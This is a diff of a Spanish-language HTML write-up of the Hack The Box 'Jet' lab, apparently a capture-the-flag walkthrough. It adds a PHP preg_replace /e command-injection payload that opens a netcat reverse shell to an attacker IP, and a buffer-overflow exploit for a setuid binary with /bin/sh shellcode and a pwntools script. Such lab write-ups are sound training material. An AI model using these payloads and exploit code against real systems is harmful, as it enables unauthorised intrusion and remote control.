@@ -96,7 +96,7 @@ Machine LogForge
                          <!--First Flag-->
                          <h3 style="color: #dacece;">Flag 1: Connect</h3>
                          <p>La primera flag se consigue bajo la instruccion de conectar, primero verificamos si tenemos conexión e indirectamente conocemos el sistema operativo <a class="code">[ttl=64 - Linux]</a> bajo el cual se encuentra el servidor.</p>
-                         <pre class="pre-code"><a class="command">> ping</a> 10.13.37.10
+                         <pre class="pre-code"><a class="command">❯ ping</a> 10.13.37.10
 10.13.37.10 (10.13.37.10) 56(84) bytes of data.
 64 bytes from 10.13.37.10: icmp_seq=1 ttl=63 time=81.1 ms
 64 bytes from 10.13.37.10: icmp_seq=2 ttl=63 time=81.9 ms
@@ -107,7 +107,7 @@ Machine LogForge
 4 packets transmitted, 4 received, 0% packet loss, time 3005ms
 rtt min/avg/max/mdev = 80.776/81.225/81.910/0.418 ms</pre>
                          <p>Seguido a ello revisamos los servicios disponibles con <a class="code">nmap</a></p>
-                         <pre class="pre-code"><a class="command">> nmap</a> -p- --open -sS -T5 -n -Pn -oN JetPorts.nmap 10.13.37.10
+                         <pre class="pre-code"><a class="command">❯ nmap</a> -p- --open -sS -T5 -n -Pn -oN JetPorts.nmap 10.13.37.10
 Nmap scan report for 10.13.37.10
 Host is up (0.089s latency).
 Not shown: 65529 closed tcp ports (reset)
@@ -127,7 +127,7 @@ PORT     STATE SERVICE
                          <!--Second Flag-->
                          <h3 style="color: #dacece;">Flag 2: Digging in...</h3>
                          <p>Para la segunda flag el nombre es una pista, basandonos en el escaneo de <a class="code">Nmap</a> anterior, encontramos el servicio de dominio abierto en el puerto 53, usaremos la herramienta <a class="code">dig</a> para descubrir otros dominios asociados al servidor encontrando <a class="code">www.securewebinc.jet</a></p>
-                         <pre class="pre-code"><a class="command">> dig</a> @10.13.37.10 -x 10.13.37.10
+                         <pre class="pre-code"><a class="command">❯ dig</a> @10.13.37.10 -x 10.13.37.10
 ; <<>> DiG 9.16.33-Debian <<>> @10.13.37.10 -x 10.13.37.10
 ; (1 server found)
 ;; global options: +cmd
@@ -178,7 +178,7 @@ PORT     STATE SERVICE
                          </span>
                          <p><br>Continuando con el SQLi ejecute la herramienta automatizada <a class="code">sqlmap</a> con la solicitud almacenada la cual si dió resultados, logrando enumerar las bases de datos alojadas.</p>
                          <span>
-                              <pre class="pre-code"><a class="command">> cat</a> dologin
+                              <pre class="pre-code"><a class="command">❯ cat</a> dologin
 ────┬───────────────────────────────────────────────────────────────────────────────────────────────
     │ File: dologin
 ────┼───────────────────────────────────────────────────────────────────────────────────────────────
@@ -202,7 +202,7 @@ PORT     STATE SERVICE
                          </span>
                          <br><br>
                          
-                         <pre class="pre-code"><a class="command">> sqlmap</a> -r dologin -dbs
+                         <pre class="pre-code"><a class="command">❯ sqlmap</a> -r dologin -dbs
 [INFO] parsing HTTP request from 'dologin'
 ---
 Parameter: username (POST)
@@ -224,7 +224,7 @@ available databases [2]:
 [*] information_schema
 [*] jetadmin</pre>
                          <p><br>Procedi a dumpear la base de datos <a class="code">jetadmin</a> obteniendo un hash del usuario admin.</p>
-                         <pre class="pre-code"><a class="command">> sqlmap</a> -r dologin -D jetadmin --dump
+                         <pre class="pre-code"><a class="command">❯ sqlmap</a> -r dologin -D jetadmin --dump
 [WARNING] no clear password(s) found
 Database: jetadmin
 Table: users
@@ -271,8 +271,240 @@ Table: users
 <a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_message&lt;br>&lt;/p></a>&
 <a class="a-blue">_wysihtml5_mode</a>=1</pre>
                          </p>
-                         <!--End Fifth flag-->
+                         <p>Dada la lógica de <a class="code">Palabrotas</a> parece que realiza una busqueda y reemplazo de palabras, esto bajo las expresiones regulares <a class="code">/i</a> en base a esto probaremos la expresion regular de execución <a class="code">/e</a><br>Para prueba de concepto lanzare una traza icmp a mi maquina en espera de esta trama, reemplazando el payload tanto en el subject y el message.</p>
+                         <pre class="pre-code">
+<a class="a-blue">swearwords</a>[<a class="a-red">/s0b3k_payload/e</a>]=<a class="a-green">ping -c1 10.10.14.10</a>&
+<a class="a-blue">to</a>=<a class="a-green">s0bek@mailtest.com</a>&
+<a class="a-blue">subject</a>=<a class="a-green">s0b3k_payload</a>&
+<a class="a-blue">message</a>=<a class="a-green">&lt;p>s0b3k_payload&lt;br>&lt;/p></a>&
+<a class="a-blue">_wysihtml5_mode</a>=1</pre>
+                         <p>
+                              <br>La trama encodeada se vera de la siguiente manera:
+                         </p>
+                         <pre class="pre-code">
+swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('ping%2010.10.14.10')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
+                         <br>
+                         <p>A pesar de recivir la captura con la escucha de tcpdump, vemos que la peticion igual reemplaza el mensaje en el payload adjunto y se puede ver evidenciado en Burpsuite.
+                         </p>
+                         <span>
+                              <img src="../images/HTB/Jet/POC_RCE.png"/>
+                         </span>
+                         <p>
+                              <br>
+                              Aplicaria lo mismo para la shell reversa con el siguiente payload, de manera que ganamos acceso al sistema y podemos observar la flag <a class="code">JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}</a>
+                         </p>
+                         <pre class="pre-code">
+swearwords%5B%2Fs0b3k_payload%2Fe%5D=system('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.10%204444%20%3E%2Ftmp%2Ff')&to=s0bek%40mailtest.com&subject=s0b3k_payload&message=%3Cp%3Es0b3k_payload%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1</pre>
+                         <pre class="pre-code">
+<a class="command">❯ nc</a> -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.37.10 48924
+sh: can't access tty; job control turned off
+$ whoami
+www-data
+$ ls  
+a_flag_is_here.txt
+...
 
+$ cat "a_flag_is_here.txt"
+JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
+$ </pre>                              
+
+                         <!--End Fifth flag-->
+                         
+                         <!--Start Sixth flag-->
+                         <h3 style="color: #dacece;">Flag 6: Overflow</h3>
+                         <p> En la sexta flag llamada <a class="code">overflow</a> practicamente nos adelanta que ejecutaremos un <a class="code">[BOF] Buffer OverFlow.</a><br>Asi, despues del tratamiento de la tty comencé buscando un archivo binario que permita al usuario actual ejecutarse como sudo.</p>
+                         
+                         <pre class="pre-code">
+www-data@jet:~$ find / -perm -u+s 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/lib/uncompress.so
+<a style="background-color: coral; color: #f0f0f0;">/home/leak</a>
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/ping6</pre>
+                         <p>El mas llamativo, por su ubicacion es el archivo leak, así, verificando su contenido lo lleve a mi máquina.</p>
+                         
+                         <pre class="pre-code">
+www-data@jet:/home$ file leak
+leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
+www-data@jet:/home$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 ...</pre>
+                         <pre class="pre-code">
+<a class="command">❯ wget</a> http://10.13.37.10:8888/leak
+Conectando con 10.13.37.10:8888... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 9112 (8,9K) [application/octet-stream]
+Grabando a: «leak»
+
+leak          100%[====================================================================================>]   8,90K  --.-KB/s    en 0s      
+
+(271 MB/s) - «leak» guardado
+                         </pre>
+                         <p>Revisandolo su ejecucion normal, nos da lo siguiente</p>
+                         <pre class="pre-code">
+<a class="command">❯ ./leak</a>
+Oops, I'm leaking! 0x7ffe3080fb60
+Pwn me ¯\_(ツ)_/¯ 
+> hola</pre>
+                         <p>Si al input le anidamos una cadena mas larga se produce un error de segmentacion, desbordando el espacio en memoria al cual se almacene este input.</p>
+                         <pre class="pre-code">
+<a class="command">❯ ./leak</a>
+Oops, I'm leaking! 0x7ffda23327f0
+Pwn me ¯\_(ツ)_/¯ 
+> 12345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912345678912
+zsh: segmentation fault  ./leak</pre>
+                         <p>Revisemos esto con gdb, adjunte una cadena de 200 veces 5 y valide que sea reemplazado en el RSP, nos indica que el 5 esta presente 128 veces, con esto ya podriamos deducir que el offset es <a class="code">72 [200-128]</a></p>
+                         <pre class="pre-code">
+<a class="command">❯ gdb</a> -q leak
+Reading symbols from leak...
+(No debugging symbols found in leak)
+(gdb) run
+Starting program: /home/s0bek/HTB/Jet/leak 
+Oops, I'm leaking! 0x7fffffffe4a0
+Pwn me ¯\_(ツ)_/¯ 
+> 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040088e in main ()
+(gdb) x/20s $rsp
+0x7fffffffe4e8:    '5' &lt;repeats 128 times>, "\n"
+0x7fffffffe56a:    ""
+0x7fffffffe56b:    ""
+0x7fffffffe56c:    ""</pre>
+                         <p>Para ser mas precisos podemos encontrar el punto en el que la memoria se desborda provocando la segmentación creando un patrón de caracteres con la herramienta de metasploit.</p>
+                         </p>
+                         <pre class="pre-code"><a class="command">❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb</a> -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</pre>
+                         
+                         <p>Esta cadena la incluiremos en GDB y ahora buscaremos la dirección en la que termina el RSP</p>
+<pre class="pre-code">(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/s0bek/HTB/Jet/leak 
+Oops, I'm leaking! 0x7fffffffe4a0
+Pwn me ¯\_(ツ)_/¯ 
+> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040088e in main ()
+(gdb) x/wx $rsp
+0x7fffffffe4e8:    0x41346341
+(gdb)</pre>
+                         <p>Con metasploit buscaremos la longitud del espacio en offset en el cual desborda</p>
+                         <pre class="pre-code">
+<a class="command">❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb</a> -q 0x41346341
+[*] Exact match at offset 72</pre>
+                         <p>Ya que la salida del programa nos indica el leaking o EIP, temporalmente determinaremos el tamaño del Payload de la siguiente manera</p>
+                         <pre class="pre-code">
+<a class="a-red">Shellcode</a> = int(?)
+<a class="a-green">Buffer</a> = \x55 * (72 - len(Shellcode))
+<a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
+                         <p>Agregue un shellcode que no sobrepase la longitud destinada al offset, <a href="https://www.exploit-db.com/shellcodes/46907">exploitdb</a> contiene uno que ejecuta un /bin/sh.</p>
+                         <pre class="pre-code">
+\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</pre>
+                         <p>Como vemos, el shellcode tendra una longitud de 23 bytes, de manera que nuestro payload quedaria de la siguiente manera.</p>
+                         <pre class="pre-code">
+<a class="a-red">Shellcode</a> = \x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05
+<a class="a-green">Buffer</a> = \x55 * (72 - 23)
+<a class="a-blue">RIP</a> = b"0x7fffffffe4a0"</pre>
+                         <p>Ahora verificaremos que el shellcode sea incluido dentro de nuestro offset justo antes de nuestro NOPs. Creare el payload completo con python y revisare el RSP del buffer con gdb</p>
+                         <pre class="pre-code">
+<a class="command">❯ python3 </a>
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+<a class="command">>>></a> from pwn import *
+<a class="command">>>></a> shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+<a class="command">>>></a> offset = b"\x55" * (72-23)
+<a class="command">>>></a> eip = 0x7fffffffe4a0
+<a class="command">>>></a> payload = shellcode + offset + p64(eip)
+<a class="command">>>></a> print(payload)
+H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xa0\xe4\xff\xff\xff\x7f\x00\x00</pre>
+<pre class="pre-code">
+(gdb) run
+Starting program: /home/s0bek/HTB/Jet/leak 
+Oops, I'm leaking! 0x7fffffffe4a0
+Pwn me ¯\_(ツ)_/¯ 
+> H\xbf/bin//shWT_j;X\x99\x0f\x05UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xa0\xe4\xff\xff\xff\x7f\x00\x00
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040088e in main ()
+
+(gdb) x/200xb $rsp-72
+<a class="a-blue">0x7fffffffe4a0:</a>    <a class="a-red">0x48    0x31    0x5c    0x78    0x66    0x36    0x56    0x48</a>
+<a class="a-blue">0x7fffffffe4a8:</a>    <a class="a-red">0x5c    0x78    0x62    0x66    0x2f    0x62    0x69    0x6e</a>
+<a class="a-blue">0x7fffffffe4b0:</a>    <a class="a-red">0x2f    0x2f    0x73    0x68    0x57    0x54    0x5f    0x6a</a>
+<a class="a-blue">0x7fffffffe4b8:</a>    <a class="a-red">0x3b    0x58    0x5c    0x78    0x39    0x39    0x5c    0x78</a>
+<a class="a-blue">0x7fffffffe4c0:</a>    <a class="a-red">0x30    0x66    0x5c    0x78    0x30    0x35    <a class="a-green">0x55    0x55</a>
+<a class="a-blue">0x7fffffffe4c8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+<a class="a-blue">0x7fffffffe4d0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+<a class="a-blue">0x7fffffffe4d8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+<a class="a-blue">0x7fffffffe4e0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+<a class="a-blue">0x7fffffffe4e8:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+<a class="a-blue">0x7fffffffe4f0:</a>    <a class="a-green">0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x5c</a>
+<a class="a-blue">0x7fffffffe4f8:</a>    0x78    0x61    0x30    0x5c    0x78    0x65    0x34    0x5c
+<a class="a-blue">0x7fffffffe500:</a>    0x78    0x66    0x66    0x5c    0x78    0x66    0x66    0x5c
+<a class="a-blue">0x7fffffffe508:</a>    0x78    0x66    0x66    0x5c    0x78    0x37    0x66    0x5c
+<a class="a-blue">0x7fffffffe510:</a>    0x78    0x30    0x30    0x5c    0x78    0x30    0x30    0x0a
+<a class="a-blue">0x7fffffffe518:</a>    0x00    0xf9    0xa9    0x47    0xe7    0x96    0x2d    0x0b
+<a class="a-blue">0x7fffffffe520:</a>    0xa0    0x06    0x40    0x00    0x00    0x00    0x00    0x00</pre>
+
+                         <p>Aunque notamos algunas variaciones en el payload debido a la interpretacion, el payload quedo funcional. 
+                         <br>Existe una complicación en que la dirección del RIP es variable entre cada ejecución fuera de gdb, para solventar esto filtraremos con python la salida del programa hasta llegar al RIP y agregarlo en una variable.
+                         <br> Adicional a ello para recibir la ejecución del comando levantaremos del lado del servidor el archivo en ejecución a través de socat y con python accederemos a la ejecución del binario de manera remota.
+                         <br><br>El script en python queda de la siguiente manera:
+                         </p>
+                         <pre class="pre-code">
+<a class="command">❯ cat</a> leaking.py
+────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+    │ File: leaking.py
+────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+  1 │ #!/usr/bin/python3
+  2 │ 
+  3 │ from pwn import *
+  4 │ 
+  5 │ shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+  6 │ offset = b"\x55"*(72-23)
+  7 │ 
+  8 │ shell = remote('10.13.37.10', 1337)
+  9 │ shell.recvuntil(b"Oops, I'm leaking! ")
+ 10 │ eip = int(shell.recvuntil(b"\n"),16)
+ 11 │ 
+ 12 │ payload = shellcode + offset + p64(eip)
+ 13 │ shell.recvuntil(b"> ")
+ 14 │ shell.sendline(payload)
+ 15 │ shell.interactive()
+────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────</pre>
+                         
+                         <p>Exponemos la ejecución del binario</p>
+                         <pre class="pre-code">www-data@jet:/home$ socat TCP-LISTEN:1337,fork EXEC:./leak &</pre>
+                         <p>Ejecución del script</p>
+                         <pre class="pre-code">
+<a class="command">❯ ./leaking.py</a>
+[+] Opening connection to 10.13.37.10 on port 1337: Done
+[*] Switching to interactive mode
+<a class="a-red">$</a> whoami
+alex</pre>
+                         <!--End Sixth flag-->
                          <div class="blog-author">
                               <div class="media">
                                    <div class="media-object pull-left">
